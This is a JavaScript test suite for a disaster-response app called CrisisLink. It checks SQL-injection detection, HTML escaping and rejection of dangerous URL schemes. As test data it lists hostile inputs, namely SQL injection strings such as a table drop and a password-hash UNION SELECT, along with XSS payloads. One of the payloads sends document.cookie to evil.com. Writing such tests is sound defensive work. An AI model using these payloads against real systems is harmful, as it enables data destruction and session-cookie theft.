import test, { describe, it } from 'node:test';
import assert from 'node:assert/strict';

describe('CrisisLink Injection & Input Sanitization Audit Suite', () => {
  describe('SQL Injection Prevention & Parameterized Queries', () => {
    it('should detect SQL injection attack tokens and require parameterization', () => {
      const maliciousInputs = [
        "' OR '1'='1",
        "'; DROP TABLE public.disasters; --",
        "1 UNION SELECT null, username, password_hash FROM auth.users--",
        "admin'--",
        "' OR 1=1#"
      ];

      function inspectSqlInjectionVector(input) {
        const sqlPatterns = [/(\b(UNION|SELECT|DROP|INSERT|DELETE|ALTER|UPDATE)\b)/i, /--/, /#/, /'/, /;/];
        const isSuspicious = sqlPatterns.some(pattern => pattern.test(input));
        return {
          detected: isSuspicious,
          // Parameterized safe substitution simulation
          safeBinding: { paramIndex: 1, literalValue: input }
        };
      }

      maliciousInputs.forEach(input => {
        const result = inspectSqlInjectionVector(input);
        assert.strictEqual(result.detected, true, `SQL injection token must be flagged for input: ${input}`);
        assert.strictEqual(typeof result.safeBinding.literalValue, 'string');
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Sanitization in Disaster Media & Descriptions', () => {
    it('should sanitize or HTML-encode hazardous script tags in citizen descriptions', () => {
      const htmlXssVectors = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=fetch("http://evil.com/cookie?c="+document.cookie)>'
      ];

      function escapeHTML(str) {
        return str
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
      }

      htmlXssVectors.forEach(vector => {
        const sanitized = escapeHTML(vector);
        assert.ok(!sanitized.includes('<script>'));
        assert.ok(!sanitized.includes('<img'));
        assert.ok(!sanitized.includes('<svg'));
        assert.ok(sanitized.includes('&lt;') || sanitized.includes('&gt;'));
      });
    });

    it('should validate URLs in disaster media to reject javascript: or data: URIs', () => {
      const dangerousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox("test")'
      ];
      const validUrls = [
        'https://mujagrmyvxbrqwaospwd.supabase.co/storage/v1/object/public/disaster-media/flood.jpg',
        'https://res.cloudinary.com/crisislink/image/upload/v1/evidence.png'
      ];

      function isValidMediaUrl(url) {
        try {
          const parsed = new URL(url);
          return parsed.protocol === 'https:' || parsed.protocol === 'http:';
        } catch {
          return false;
        }
      }

      dangerousUrls.forEach(url => {
        assert.strictEqual(isValidMediaUrl(url), false, `Dangerous scheme ${url} must be rejected`);
      });

      validUrls.forEach(url => {
        assert.strictEqual(isValidMediaUrl(url), true, `Legitimate HTTPS url ${url} must be accepted`);
      });
    });
  });
});
